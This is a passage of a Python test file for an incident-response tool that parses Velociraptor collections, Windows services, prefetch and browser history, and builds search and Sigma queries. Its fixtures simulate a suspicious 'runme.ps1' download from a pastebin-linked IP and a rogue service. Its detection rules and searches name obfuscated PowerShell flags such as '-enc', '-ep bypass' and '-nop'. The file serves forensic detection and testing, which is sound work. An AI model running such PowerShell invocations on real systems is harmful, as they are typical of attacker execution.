    assert sanitized["appcompat"]["artifact_type"] == "shimcache_entry"
    assert sanitized["appcompat"]["path"] == r"C:\Windows\System32\SecurityHealth\10.0.29554.1001-0\SecurityHealthHost.exe"
    assert sanitized["appcompat"]["name"] == "SecurityHealthHost.exe"


def test_sanitize_event_keeps_service_and_persistence_objects() -> None:
    request = DebugExportRequest(scope="evidence", evidence_id="ev-1")
    sanitized = _sanitize_event(
        {
            "id": "evt-service-1",
            "artifact": {"type": "service", "parser": "windows_service_registry"},
            "event": {"type": "service", "category": "persistence"},
            "service": {"name": "WinDefend", "image_path": r"C:\ProgramData\Microsoft\Windows Defender\Platform\1.2.3.4\MsMpEng.exe"},
            "persistence": {"mechanism": "windows_service", "name": "WinDefend", "path": r"C:\ProgramData\Microsoft\Windows Defender\Platform\1.2.3.4\MsMpEng.exe"},
            "execution": {"source": "service", "confidence": "low", "is_execution_confirmed": False},
        },
        request,
    )
    assert sanitized["service"]["name"] == "WinDefend"
    assert sanitized["persistence"]["mechanism"] == "windows_service"


def test_build_service_parse_report_uses_parser_audit_totals() -> None:
    parser_audit = [
        {
            "parser_name": "windows_service_registry",
            "artifact_type": "service",
            "parser_status": "completed",
            "records_read": 773,
            "records_parsed": 773,
            "records_indexed": 773,
            "records_failed": 0,
            "sample_records": [{"service_name": "WinDefend", "image_path": r"C:\ProgramData\Microsoft\Windows Defender\Platform\1.2.3.4\MsMpEng.exe"}],
            "warnings": [],
            "errors": [],
        }
    ]
    discovery_candidates = [{"category": "service", "artifact_type": "service", "selected_for_extraction": True}]
    events = [{"artifact": {"type": "service", "parser": "windows_service_registry"}, "event": {"type": "service"}}]
    report = _build_service_parse_report(parser_audit, discovery_candidates, events, scope="evidence")
    assert report["aggregation_scope"] == "evidence"
    assert report["records_read"] == 773
    assert report["records_parsed"] == 773
    assert report["records_indexed"] == 773
    assert report["records_failed"] == 0
    assert report["sample_by_event_type"]["service"] == 1
    assert report["sample_records"][0]["service_name"] == "WinDefend"


def test_build_prefetch_parse_report_counts_partial_once() -> None:
    parser_audit = [
        {
            "parser_name": "prefetch_raw",
            "parser_status": "partial",
            "prefetch_files_opened": 1,
            "prefetch_files_parsed": 1,
            "prefetch_files_failed": 0,
            "prefetch_events_indexed": 1,
            "prefetch_magic_counts": {"SCCA": 1},
            "prefetch_versions_seen": {"30": 1},
            "examples_partial_files": ["C:\\Windows\\Prefetch\\RARETOOL.EXE-ABCD1234.pf"],
        }
    ]
    discovery_candidates = [{"artifact_type": "prefetch_raw", "category": "prefetch", "selected_for_extraction": True}]
    events = [
        {
            "artifact": {"type": "prefetch", "parser": "prefetch_raw"},
            "event": {"type": "prefetch_observed"},
            "prefetch": {"source_file": "C:\\Windows\\Prefetch\\RARETOOL.EXE-ABCD1234.pf"},
            "process": {"name": "RARETOOL.EXE", "path": None},
            "execution": {"run_count": None},
            "@timestamp": None,
            "tags": ["prefetch"],
        }
    ]
    report = _build_prefetch_parse_report(parser_audit, discovery_candidates, events)
    assert report["total_prefetch_partial"] == 1
    assert report["examples_partial"] == ["C:\\Windows\\Prefetch\\RARETOOL.EXE-ABCD1234.pf"]


def test_build_prefetch_parse_report_tracks_zero_record_failures() -> None:
    parser_audit = [
        {
            "parser_name": "prefetch_raw",
            "parser_status": "failed_unsupported",
            "prefetch_files_opened": 1,
            "prefetch_files_failed": 1,
            "prefetch_events_indexed": 0,
            "prefetch_magic_counts": {"MAM": 1},
            "prefetch_mam_compressed_count": 1,
            "prefetch_decompression_failed_count": 1,
            "reason_if_zero_records": "mam_decompression_not_supported",
            "examples_failed_files": ["C:\\Windows\\Prefetch\\CHROME.EXE-AED7BA45.pf"],
        }
    ]
    report = _build_prefetch_parse_report(parser_audit, [{"artifact_type": "prefetch_raw"}], [])
    assert report["total_prefetch_failed"] == 1
    assert report["mam_compressed_count"] == 1
    assert report["mam_decompression_failed_count"] == 1
    assert report["zero_record_reason_counts"]["mam_decompression_not_supported"] == 1
    assert report["examples_zero_records"] == ["C:\\Windows\\Prefetch\\CHROME.EXE-AED7BA45.pf"]


def test_apply_velociraptor_selection_metadata_marks_non_selected_candidates() -> None:
    metadata = {"velociraptor_discovery": {"candidates": [{"id": "lnk-1", "category": "lnk", "supported": True, "parser_status": "parsed_native"}, {"id": "evtx-1", "category": "evtx", "supported": True, "parser_status": "parsed_native"}, {"id": "amcache-1", "category": "amcache", "supported": False, "parser_status": "detected_not_implemented"}]}}
    updated = _apply_velociraptor_selection_metadata(metadata, metadata["velociraptor_discovery"]["candidates"], [metadata["velociraptor_discovery"]["candidates"][0]])
    candidates = {candidate["id"]: candidate for candidate in updated["velociraptor_discovery"]["candidates"]}
    assert updated["selected_artifact_types"] == ["lnk"]
    assert candidates["lnk-1"]["selected_for_extraction"] is True
    assert candidates["evtx-1"]["selected_for_extraction"] is False
    assert candidates["evtx-1"]["parser_status"] == "skipped_not_selected"
    assert candidates["amcache-1"]["parser_status"] == "skipped_not_selected"
    assert updated["not_selected_candidates_count_by_category"]["evtx"] == 1
    assert updated["not_selected_candidates_count_by_category"]["amcache"] == 1


def test_apply_velociraptor_selection_metadata_for_scheduled_task_keeps_other_detected_types_unselected() -> None:
    metadata = {
        "velociraptor_discovery": {
            "candidates": [
                {"id": "sched-1", "category": "scheduled_task", "supported": True, "parser_status": "ready"},
                {"id": "prefetch-1", "category": "prefetch", "supported": True, "parser_status": "parsed_native"},
                {"id": "usb-1", "category": "usb", "supported": True, "parser_status": "parsed_native"},
            ]
        }
    }
    updated = _apply_velociraptor_selection_metadata(
        metadata,
        metadata["velociraptor_discovery"]["candidates"],
        [metadata["velociraptor_discovery"]["candidates"][0]],
    )
    candidates = {candidate["id"]: candidate for candidate in updated["velociraptor_discovery"]["candidates"]}
    assert updated["selected_artifact_types"] == ["scheduled_task"]
    assert candidates["sched-1"]["selected_for_extraction"] is True
    assert candidates["prefetch-1"]["selected_for_extraction"] is False
    assert candidates["usb-1"]["selected_for_extraction"] is False
    assert candidates["prefetch-1"]["parser_status"] == "skipped_not_selected"
    assert candidates["usb-1"]["parser_status"] == "skipped_not_selected"
    assert updated["not_selected_candidates_count_by_category"]["prefetch"] == 1
    assert updated["not_selected_candidates_count_by_category"]["usb"] == 1


def test_list_velociraptor_artifacts_builds_native_evtx_lnk_prefetch_amcache_shimcache_and_service_jobs(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setattr("app.ingest.raw_parsers.router.evtx_native_available", lambda: True)
    monkeypatch.setattr("app.ingest.raw_parsers.router.amcache_native_available", lambda: True)
    monkeypatch.setattr("app.ingest.raw_parsers.router.shimcache_native_available", lambda: True)
    monkeypatch.setattr("app.ingest.raw_parsers.router.windows_service_native_available", lambda: True)
    uploads = tmp_path / "uploads" / "auto" / "C%3A"
    evtx_path = uploads / "Windows/System32/winevt/Logs/Security.evtx"
    lnk_path = uploads / "Users/alex/AppData/Roaming/Microsoft/Windows/Recent/report.lnk"
    pf_path = uploads / "Windows/Prefetch/CHROME.EXE-D999B1B4.pf"
    amcache_path = uploads / "Windows/AppCompat/Programs/Amcache.hve"
    system_path = uploads / "Windows/System32/config/SYSTEM"
    evtx_path.parent.mkdir(parents=True)
    lnk_path.parent.mkdir(parents=True)
    pf_path.parent.mkdir(parents=True)
    amcache_path.parent.mkdir(parents=True, exist_ok=True)
    system_path.parent.mkdir(parents=True, exist_ok=True)
    evtx_path.write_text("", encoding="utf-8")
    lnk_path.write_bytes(_build_minimal_shell_link_bytes(local_path="C:\\Users\\alex\\Documents\\report.docx"))
    pf_path.write_bytes(_build_minimal_prefetch_bytes())
    amcache_path.write_bytes(b"fake")
    system_path.write_bytes(b"fake")
    discovery = discover_velociraptor_evidences(tmp_path)
    selected = [candidate.as_dict() for candidate in discovery.candidates if candidate.artifact_type in {"evtx_raw", "lnk_raw", "prefetch_raw", "amcache", "shimcache", "service"}]
    artifacts = list_velociraptor_artifacts(tmp_path, selected_candidates=selected)
    parsers = {artifact["parser"] for artifact in artifacts}
    types = {artifact["artifact_type"] for artifact in artifacts}
    assert "lnk_raw" in parsers
    assert "prefetch_raw" in parsers
    assert "amcache_raw" in parsers
    assert "shimcache_raw" in parsers
    assert "windows_service_registry" in parsers
    if any(candidate.artifact_type == "evtx_raw" for candidate in discovery.candidates):
        assert "evtx_raw" in parsers
        assert "windows_event" in types
    assert "lnk" in types
    assert "prefetch" in types
    assert "amcache" in types
    assert "shimcache" in types
    assert "service" in types


def test_list_velociraptor_artifacts_prefetch_only_selection_excludes_other_categories(tmp_path: Path) -> None:
    uploads = tmp_path / "uploads" / "auto" / "C%3A"
    pf_path = uploads / "Windows/Prefetch/POWERSHELL.EXE-12345678.pf"
    evtx_path = uploads / "Windows/System32/winevt/Logs/Security.evtx"
    lnk_path = uploads / "Users/alex/AppData/Roaming/Microsoft/Windows/Recent/report.lnk"
    amcache_path = uploads / "Windows/AppCompat/Programs/Amcache.hve"
    pf_path.parent.mkdir(parents=True)
    evtx_path.parent.mkdir(parents=True)
    lnk_path.parent.mkdir(parents=True)
    amcache_path.parent.mkdir(parents=True)
    pf_path.write_bytes(_build_minimal_prefetch_bytes(executable_name="POWERSHELL.EXE", executable_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
    evtx_path.write_text("", encoding="utf-8")
    lnk_path.write_bytes(_build_minimal_shell_link_bytes(local_path="C:\\Users\\alex\\Documents\\report.docx"))
    amcache_path.write_text("", encoding="utf-8")
    discovery = discover_velociraptor_evidences(tmp_path)
    selected = [candidate.as_dict() for candidate in discovery.candidates if candidate.artifact_type == "prefetch_raw"]
    artifacts = list_velociraptor_artifacts(tmp_path, selected_candidates=selected)
    assert artifacts
    assert {artifact["artifact_type"] for artifact in artifacts} == {"prefetch"}


def test_list_velociraptor_artifacts_powershell_only_selection_excludes_evtx(tmp_path: Path) -> None:
    uploads = tmp_path / "uploads" / "auto" / "C%3A"
    history_path = uploads / "Users/alex/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"
    evtx_path = uploads / "Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx"
    history_path.parent.mkdir(parents=True, exist_ok=True)
    evtx_path.parent.mkdir(parents=True, exist_ok=True)
    history_path.write_text("Get-Process\n", encoding="utf-8")
    evtx_path.write_text("", encoding="utf-8")
    discovery = discover_velociraptor_evidences(tmp_path)
    selected = [candidate.as_dict() for candidate in discovery.candidates if candidate.category == "powershell"]
    artifacts = list_velociraptor_artifacts(tmp_path, selected_candidates=selected)
    assert artifacts
    assert {artifact["artifact_type"] for artifact in artifacts} == {"powershell"}
    assert all(artifact["parser"] != "evtx_raw" for artifact in artifacts)


def test_discover_velociraptor_system_offers_service_and_scheduled_task_keeps_priority(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setattr("app.ingest.raw_parsers.router.shimcache_native_available", lambda: True)
    monkeypatch.setattr("app.ingest.raw_parsers.router.windows_service_native_available", lambda: True)
    uploads = tmp_path / "uploads" / "auto" / "C%3A"
    system_path = uploads / "Windows/System32/config/SYSTEM"
    task_path = uploads / "Windows/System32/Tasks/Microsoft/Windows/USB/Usb-Notifications"
    system_path.parent.mkdir(parents=True, exist_ok=True)
    task_path.parent.mkdir(parents=True, exist_ok=True)
    system_path.write_bytes(b"fake")
    task_path.write_text("<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"></Task>", encoding="utf-8")
    discovery = discover_velociraptor_evidences(tmp_path)
    candidate_types = {(candidate.category, candidate.artifact_type, candidate.parser) for candidate in discovery.candidates}
    assert ("service", "service", "windows_service_registry") in candidate_types
    assert ("scheduled_task", "scheduled_task", "scheduled_task_xml") in candidate_types
    selected = [candidate.as_dict() for candidate in discovery.candidates if candidate.artifact_type == "service"]
    artifacts = list_velociraptor_artifacts(tmp_path, selected_candidates=selected)
    assert {artifact["artifact_type"] for artifact in artifacts} == {"service"}


def test_windows_service_raw_parser_parses_system_hive(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    class FakeValue:
        def __init__(self, name: str, value):
            self._name = name
            self._value = value

        def name(self):
            return self._name

        def value(self):
            return self._value

    class FakeKey:
        def __init__(self, name: str, values=None, subkeys=None, timestamp=None):
            self._name = name
            self._values = values or []
            self._subkeys = subkeys or []
            self._timestamp = timestamp or datetime(2026, 5, 3, 9, 0, 0, tzinfo=UTC)

        def name(self):
            return self._name

        def values(self):
            return self._values

        def subkeys(self):
            return self._subkeys

        def timestamp(self):
            return self._timestamp

    class FakeHive:
        def __init__(self):
            svc = FakeKey(
                "BadSvc",
                values=[
                    FakeValue("ImagePath", "C:\\Users\\dfir\\AppData\\Roaming\\updater.exe"),
                    FakeValue("Start", 2),
                    FakeValue("Type", 16),
                    FakeValue("ObjectName", "LocalSystem"),
                ],
            )
            services = FakeKey("Services", subkeys=[svc])
            control = FakeKey("ControlSet001", subkeys=[services])
            self._root = FakeKey("ROOT", subkeys=[control])

        def root(self):
            return self._root

    fake_module = SimpleNamespace(Registry=lambda _: FakeHive())
    monkeypatch.setattr("app.ingest.raw_parsers.service_parser._load_registry_module", lambda: fake_module)
    path = tmp_path / "SYSTEM"
    path.write_bytes(b"fake")
    parser = WindowsServiceRawParser()
    result = parser.parse(
        path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={
            "artifact_type": "service",
            "name": "Windows Service raw - SYSTEM",
            "source_path": "C:\\Windows\\System32\\config\\SYSTEM",
            "parser": "windows_service_registry",
            "source_tool": "native_windows_service",
            "source_format": "registry_hive",
        },
    )
    assert result.parser_status == "parsed_native"
    assert result.records_read == 1
    assert len(result.events) == 1
    assert result.events[0]["artifact"]["type"] == "service"
    assert result.events[0]["service"]["name"] == "BadSvc"
    assert result.events[0]["risk_score"] >= 40


def test_windows_service_raw_parser_skips_empty_auxiliary_keys(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    class FakeKey:
        def __init__(self, name: str, values=None, subkeys=None, timestamp=None):
            self._name = name
            self._values = values or []
            self._subkeys = subkeys or []
            self._timestamp = timestamp

        def name(self):
            return self._name

        def values(self):
            return self._values

        def subkeys(self):
            return self._subkeys

        def timestamp(self):
            return self._timestamp

    class FakeHive:
        def __init__(self):
            auxiliary = FakeKey("Parameters", timestamp=None)
            services = FakeKey("Services", subkeys=[auxiliary])
            control = FakeKey("ControlSet001", subkeys=[services])
            self._root = FakeKey("ROOT", subkeys=[control])

        def root(self):
            return self._root

    fake_module = SimpleNamespace(Registry=lambda _: FakeHive())
    monkeypatch.setattr("app.ingest.raw_parsers.service_parser._load_registry_module", lambda: fake_module)
    path = tmp_path / "SYSTEM"
    path.write_bytes(b"fake")
    parser = WindowsServiceRawParser()
    result = parser.parse(
        path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={
            "artifact_type": "service",
            "name": "Windows Service raw - SYSTEM",
            "source_path": "C:\\Windows\\System32\\config\\SYSTEM",
            "parser": "windows_service_registry",
            "source_tool": "native_windows_service",
            "source_format": "registry_hive",
        },
    )
    assert result.records_read == 0
    assert result.events == []
    assert result.parser_status == "failed"


def _create_chromium_history_db(path: Path) -> None:
    connection = sqlite3.connect(path)
    connection.executescript(
        """
        CREATE TABLE urls (
            id INTEGER PRIMARY KEY,
            url TEXT,
            title TEXT,
            visit_count INTEGER,
            typed_count INTEGER,
            last_visit_time INTEGER,
            hidden INTEGER DEFAULT 0
        );
        CREATE TABLE visits (
            id INTEGER PRIMARY KEY,
            url INTEGER,
            visit_time INTEGER,
            from_visit INTEGER,
            transition INTEGER
        );
        CREATE TABLE downloads (
            id INTEGER PRIMARY KEY,
            guid TEXT,
            current_path TEXT,
            target_path TEXT,
            start_time INTEGER,
            end_time INTEGER,
            received_bytes INTEGER,
            total_bytes INTEGER,
            state INTEGER,
            danger_type INTEGER,
            interrupt_reason INTEGER,
            mime_type TEXT,
            tab_url TEXT,
            tab_referrer_url TEXT,
            original_mime_type TEXT,
            opened INTEGER,
            site_url TEXT,
            referrer TEXT,
            by_ext_id TEXT,
            by_ext_name TEXT
        );
        CREATE TABLE downloads_url_chains (
            id INTEGER,
            chain_index INTEGER,
            url TEXT
        );
        CREATE TABLE keyword_search_terms (
            keyword_id INTEGER,
            url_id INTEGER,
            term TEXT
        );
        """
    )
    base = 13300000000000000
    connection.execute(
        "INSERT INTO urls(id, url, title, visit_count, typed_count, last_visit_time) VALUES(1, ?, ?, 3, 1, ?)",
        ("https://www.google.com/search?q=malware+analysis", "Search results", base),
    )
    connection.execute(
        "INSERT INTO visits(id, url, visit_time, from_visit, transition) VALUES(1, 1, ?, 0, 805306368)",
        (base,),
    )
    connection.execute(
        "INSERT INTO downloads(id, guid, current_path, target_path, start_time, end_time, received_bytes, total_bytes, state, danger_type, interrupt_reason, mime_type, tab_url, tab_referrer_url, original_mime_type, opened, site_url, referrer, by_ext_id, by_ext_name) VALUES(1, 'guid-1', ?, ?, ?, ?, 1200, 1200, 1, 0, 0, 'application/octet-stream', 'https://pastebin.com/raw/x', 'https://pastebin.com', 'application/octet-stream', 0, 'https://198.51.100.25/runme.ps1', 'https://pastebin.com', '', '')",
        ("C:\\Users\\alex\\Downloads\\runme.ps1", "C:\\Users\\alex\\Downloads\\runme.ps1", base, base + 1000),
    )
    connection.execute("INSERT INTO downloads_url_chains(id, chain_index, url) VALUES(1, 0, 'https://198.51.100.25/runme.ps1')")
    connection.execute("INSERT INTO keyword_search_terms(keyword_id, url_id, term) VALUES(1, 1, 'malware analysis')")
    connection.commit()
    connection.close()


def _create_firefox_places_db(path: Path) -> None:
    connection = sqlite3.connect(path)
    connection.executescript(
        """
        CREATE TABLE moz_places (
            id INTEGER PRIMARY KEY,
            url TEXT,
            title TEXT,
            visit_count INTEGER,
            typed INTEGER,
            last_visit_date INTEGER
        );
        CREATE TABLE moz_historyvisits (
            id INTEGER PRIMARY KEY,
            place_id INTEGER,
            visit_date INTEGER,
            from_visit INTEGER,
            visit_type INTEGER
        );
        """
    )
    visit_date = 1746780000000000
    connection.execute(
        "INSERT INTO moz_places(id, url, title, visit_count, typed, last_visit_date) VALUES(1, ?, ?, 2, 1, ?)",
        ("https://duckduckgo.com/?q=incident+response", "DuckDuckGo", visit_date),
    )
    connection.execute(
        "INSERT INTO moz_historyvisits(id, place_id, visit_date, from_visit, visit_type) VALUES(1, 1, ?, 0, 1)",
        (visit_date,),
    )
    connection.commit()
    connection.close()


def test_normalize_velociraptor_path_decodes_c_drive() -> None:
    assert normalize_velociraptor_path("uploads/auto/C%3A/Users/alex/AppData/Local/Google/Chrome/User Data/Default/History").endswith(
        "C:\\Users\\alex\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
    )


def test_discover_velociraptor_browser_candidates(tmp_path: Path) -> None:
    chrome_history = tmp_path / "uploads" / "auto" / "C%3A" / "Users" / "alex" / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "History"
    chrome_history.parent.mkdir(parents=True, exist_ok=True)
    chrome_history.write_bytes(b"sqlite")
    firefox_places = tmp_path / "uploads" / "auto" / "C%3A" / "Users" / "alex" / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles" / "abcd.default-release" / "places.sqlite"
    firefox_places.parent.mkdir(parents=True, exist_ok=True)
    firefox_places.write_bytes(b"sqlite")
    discovery = discover_velociraptor_evidences(tmp_path)
    assert any(candidate.browser == "Chrome" and str(candidate.profile).lower() == "default" and candidate.supported for candidate in discovery.candidates)
    assert any(candidate.browser == "Firefox" and candidate.profile == "abcd.default-release" and candidate.supported for candidate in discovery.candidates)


def test_parse_chromium_history_sqlite(tmp_path: Path) -> None:
    path = tmp_path / "History"
    _create_chromium_history_db(path)
    rows, copied = parse_chromium_history_sqlite(path, source_path="uploads/auto/C%3A/Users/alex/AppData/Local/Google/Chrome/User Data/Default/History")
    assert copied
    assert any(row.get("URL") == "https://www.google.com/search?q=malware+analysis" for row in rows)
    assert any(row.get("Target Path") == "C:\\Users\\alex\\Downloads\\runme.ps1" for row in rows)
    assert any(row.get("Search Term") == "malware analysis" for row in rows)


def test_normalize_file_supports_browser_chromium_history_sqlite(tmp_path: Path) -> None:
    path = tmp_path / "History"
    _create_chromium_history_db(path)

    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-browser-1",
        path,
        {
            "artifact_type": "browser",
            "name": path.name,
            "source_path": r"C:\Users\alex\AppData\Local\Microsoft\Edge\User Data\Default\History",
            "parser": "browser_chromium_history",
            "source_tool": "native_browser",
            "source_format": "sqlite",
        },
    )

    assert docs
    history_doc = next(doc for doc in docs if (doc.get("browser") or {}).get("url") == "https://www.google.com/search?q=malware+analysis")
    assert history_doc["artifact"]["type"] == "browser"
    assert history_doc["artifact"]["parser"] == "browser_chromium_history"
    assert history_doc["source_file"].endswith("History")
    assert history_doc["browser"]["title"] == "Search results"
    assert history_doc["browser"]["source_file"].endswith("History")


def test_parse_firefox_places_sqlite(tmp_path: Path) -> None:
    path = tmp_path / "places.sqlite"
    _create_firefox_places_db(path)
    rows, copied = parse_firefox_places_sqlite(path, source_path="uploads/auto/C%3A/Users/alex/AppData/Roaming/Mozilla/Firefox/Profiles/abcd.default-release/places.sqlite")
    assert copied
    assert rows[0]["Browser"] == "Firefox"
    assert rows[0]["URL"] == "https://duckduckgo.com/?q=incident+response"


def test_list_generic_artifacts_includes_browser_sqlite_sources_without_extensions(tmp_path: Path) -> None:
    chrome_history = tmp_path / "C%3A" / "Users" / "dfir" / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "History"
    chrome_history.parent.mkdir(parents=True, exist_ok=True)
    chrome_history.write_bytes(b"sqlite")
    firefox_places = tmp_path / "C%3A" / "Users" / "dfir" / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles" / "abcd.default-release" / "places.sqlite"
    firefox_places.parent.mkdir(parents=True, exist_ok=True)
    firefox_places.write_bytes(b"sqlite")
    login_data = tmp_path / "C%3A" / "Users" / "dfir" / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
    login_data.parent.mkdir(parents=True, exist_ok=True)
    login_data.write_bytes(b"sqlite")
    artifacts = list_generic_artifacts(tmp_path)
    by_source = {item["source_path"]: item for item in artifacts}
    history_key = str(chrome_history.relative_to(tmp_path))
    firefox_key = str(firefox_places.relative_to(tmp_path))
    login_key = str(login_data.relative_to(tmp_path))
    assert by_source[history_key]["artifact_type"] == "browser"
    assert by_source[history_key]["parser"] == "browser_chromium_history"
    assert by_source[firefox_key]["artifact_type"] == "browser"
    assert by_source[firefox_key]["parser"] == "browser_firefox_places"
    assert by_source[login_key]["artifact_type"] == "browser"
    assert by_source[login_key]["parser"] == "unsupported_sensitive_artifact"


def test_sigma_and_heuristic_queries_build() -> None:
    sigma = build_sigma_query({"detection": {"selection": {"EventID": 7045, "CommandLine|contains": "EncodedCommand"}, "condition": "selection"}})
    heuristic = build_heuristic_query(load_heuristic_rule("name: test\nquery:\n  any:\n    - field: process.command_line\n      contains: -enc\nfilters:\n  event.category:\n    - execution\n"))
    assert sigma["query"]["bool"].get("should")
    assert sigma["query"]["bool"].get("minimum_should_match") == 1
    assert heuristic["query"]["bool"]["should"]


def test_rule_engine_auto_detection() -> None:
    assert _detect_import_engine("rule.yara", "rule x {}", "auto").value == "yara"
    assert _detect_import_engine("rule.yml", "title: test\ndetection:\n  selection:\n    EventID: 7045\n  condition: selection\n", "auto").value == "sigma"


def test_delete_events_by_evidence_no_index(monkeypatch) -> None:
    class DummyIndices:
        def exists(self, index: str) -> bool:
            return False

    class DummyClient:
        indices = DummyIndices()

    monkeypatch.setattr("app.core.opensearch.get_opensearch_client", lambda: DummyClient())
    assert delete_events_by_evidence("ev-1", "case-1") == 0


def test_search_without_indices_returns_zero(monkeypatch) -> None:
    class DummyClient:
        pass

    monkeypatch.setattr("app.api.routes_search.get_opensearch_client", lambda: DummyClient())
    monkeypatch.setattr("app.api.routes_search.index_exists", lambda client, index: False)
    response = run_search(SearchRequest(query="powershell"), timeline=False)
    assert response.total == 0
    assert response.items == []


def test_dashboards_discover_url_uses_safe_rison_state() -> None:
    url = _dashboards_discover_url(case_id="case-1", query='process.name:"powershell.exe"')
    assert "/app/discover#/" in url
    assert "hideChart%3A%21t" in url
    assert "index%3A%27dfir-events%27" in url
    assert "language%3Akuery" in url
    assert "case_id%3A%22case-1%22" in url


def test_search_request_pagination_validation() -> None:
    request = SearchRequest(query="powershell", page=2, page_size=50)
    assert request.page == 2
    assert request.page_size == 50


def test_search_request_page_must_be_positive() -> None:
    try:
        SearchRequest(query="powershell", page=0)
    except Exception as exc:  # noqa: BLE001
        assert "greater than or equal to 1" in str(exc)
    else:
        raise AssertionError("Expected SearchRequest page validation to fail")


def test_search_query_uses_second_precision_and_sort() -> None:
    payload = SearchRequest(query="*", sort_by="file.modified", sort_order="asc", filters={"time_from": "2026-05-03T11:30:24", "time_to": "2026-05-03T11:30:54"}, timezone="UTC")
    body = build_search_query(payload)
    assert body["sort"][0]["file.modified"]["order"] == "asc"
    assert body["query"]["bool"]["filter"][-1]["range"]["@timestamp"]["gte"].startswith("2026-05-03T11:30:24")


def test_search_query_rejects_invalid_sort_field() -> None:
    try:
        build_search_query(SearchRequest(query="*", sort_by="not.allowed"))
    except Exception as exc:  # noqa: BLE001
        assert "Unsupported sort field" in str(exc)
    else:
        raise AssertionError("Expected unsupported sort field to fail")


def test_search_smart_numeric_query_uses_windows_event_id_ioc() -> None:
    query = _build_text_query(SearchRequest(query="4624", search_mode="smart"))
    should = ((query.get("bool") or {}).get("should") or [])
    assert {"term": {"windows.event_id": 4624}} in should


def test_search_exact_numeric_query_uses_windows_event_id_ioc() -> None:
    query = _build_text_query(SearchRequest(query="4624", search_mode="exact"))
    should = ((query.get("bool") or {}).get("should") or [])
    assert {"term": {"windows.event_id": 4624}} in should


def test_search_filter_event_id_targets_windows_event_id_for_numeric_values() -> None:
    payload = SearchRequest(query="*", filters={"event_id": ["4624"]})
    body = build_search_query(payload)
    event_id_filter = next(
        item
        for item in body["query"]["bool"]["filter"]
        if "bool" in item and item["bool"].get("should")
    )
    assert {"terms": {"windows.event_id": [4624]}} in event_id_filter["bool"]["should"]


def _collect_query_values(node, field_name: str) -> list[str]:  # noqa: ANN001
    values: list[str] = []
    if isinstance(node, dict):
        for key, value in node.items():
            if key == field_name and isinstance(value, str):
                values.append(value)
            values.extend(_collect_query_values(value, field_name))
    elif isinstance(node, list):
        for item in node:
            values.extend(_collect_query_values(item, field_name))
    return values


def _contains_query_type(node, query_type: str) -> bool:  # noqa: ANN001
    if isinstance(node, dict):
        return query_type in node or any(_contains_query_type(value, query_type) for value in node.values())
    if isinstance(node, list):
        return any(_contains_query_type(item, query_type) for item in node)
    return False


def test_search_command_query_treats_leading_hyphen_flags_as_text() -> None:
    query = _build_text_query(SearchRequest(query="powershell -ep bypass", search_mode="smart"))
    values = _collect_query_values(query, "query")
    wildcard_values = _collect_query_values(query, "value")
    assert "powershell -ep bypass" in values
    assert any("-ep" in value for value in wildcard_values)
    assert not _contains_query_type(query, "simple_query_string")


def test_search_command_query_preserves_standalone_flags() -> None:
    query = _build_text_query(SearchRequest(query="-nop", search_mode="smart"))
    wildcard_values = _collect_query_values(query, "value")
    assert any("-nop" in value for value in wildcard_values)
    assert not _contains_query_type(query, "simple_query_string")


def test_search_command_query_expands_windows_path_to_basename() -> None:
    query = _build_text_query(SearchRequest(query=r"C:\Users\public\psexec.exe", search_mode="smart"))
    wildcard_values = _collect_query_values(query, "value")
    assert any("psexec.exe" in value for value in wildcard_values)
    assert any("users" in value and "public" in value for value in wildcard_values)


def test_search_command_query_supports_relative_windows_paths() -> None:
    query = _build_text_query(SearchRequest(query=r".\f\script.ps1", search_mode="smart"))
    wildcard_values = _collect_query_values(query, "value")
    assert any("script.ps1" in value for value in wildcard_values)


def test_search_host_filter_expands_shortname_to_fqdn_wildcard() -> None:
    payload = SearchRequest(query="*", filters={"host": ["HOSTA"]})
    body = build_search_query(payload)
    wildcard_values = _collect_query_values(body["query"]["bool"]["filter"], "value")
    assert any(value.lower() == "hosta.*" for value in wildcard_values)


def test_search_query_excludes_advanced_backend_by_default() -> None:
    payload = SearchRequest(query="*", filters={"artifact_type": ["amcache"]})
    body = build_search_query(payload)
    assert {"term": {"artifact.backend_variant": "advanced"}} in body["query"]["bool"]["must_not"]


def test_search_query_can_select_advanced_backend() -> None:
    payload = SearchRequest(query="*", filters={"artifact_type": ["amcache"], "backend_variant": ["advanced"], "parser_backend": ["amcacheparser_csv"]})
    body = build_search_query(payload)
    filters = body["query"]["bool"]["filter"]
    assert {"terms": {"artifact.backend_variant": ["advanced"]}} in filters
    assert {"terms": {"artifact.parser_backend": ["amcacheparser_csv"]}} in filters
    assert "must_not" not in body["query"]["bool"]


def test_search_query_can_compare_all_backends() -> None:
    payload = SearchRequest(query="*", filters={"artifact_type": ["amcache"], "backend_variant": ["all"]})
    body = build_search_query(payload)
    filters = body["query"]["bool"]["filter"]
    assert {"terms": {"artifact.backend_variant": ["all"]}} not in filters
    assert "must_not" not in body["query"]["bool"]


def test_timeline_query_excludes_undated_documents_by_default() -> None:
    payload = SearchRequest(query="*", filters={"evidence_id": ["ev-1"]}, page_size=50)
    body = build_search_query(payload, timeline=True)
    assert {"exists": {"field": "@timestamp"}} in body["query"]["bool"]["filter"]


def test_create_detection_if_missing_does_not_duplicate() -> None:
    class DummyQuery:
        def filter(self, *args, **kwargs):  # noqa: ANN002, ANN003
            return self

        def first(self):
            return None

    class DummySession:
        def __init__(self):
            self.added = []

        def query(self, model):  # noqa: ANN001
            return DummyQuery()

        def add(self, item):
            self.added.append(item)

